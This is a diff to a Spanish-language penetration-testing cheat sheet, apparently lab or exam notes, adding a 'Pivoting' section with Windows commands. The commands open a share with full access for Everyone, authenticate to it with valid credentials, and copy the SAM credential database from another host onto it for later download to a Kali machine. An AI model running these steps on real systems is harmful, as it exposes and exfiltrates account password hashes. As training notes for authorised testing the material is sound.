@@ -248,6 +248,25 @@ HTTPServer(('0.0.0.0', 8888), UploadHandler).serve_forever()
 
 ---
 
+## Pivoting - Desde MS02 hacia MS01 (Windows)
+
+```bash 
+# compartir el share Temp en MS01 (Server Pivote)
+1. net share Temp=C:\Temp /GRANT:Everyone,FULL
+
+# Desde MS02 autenticarse al share de MS01 con creds válidas 
+2. net use \\IP_MS01\Temp /user:user Password
+
+# Copiar el archivo al server MS01 desde MS02 
+3. copy C:\windows.old\windows\system32\SAM \\IP_MS01\Temp\SAM
+
+
+NOTA:
+	- Esto se hace para despues descargar los archivos en Kali cuando se tiene un Pivote y son muy pesados para 'EvilWinRM'
+```
+
+
+--- 
 ## WINRM / EVIL-WINRM
 
 ```bash
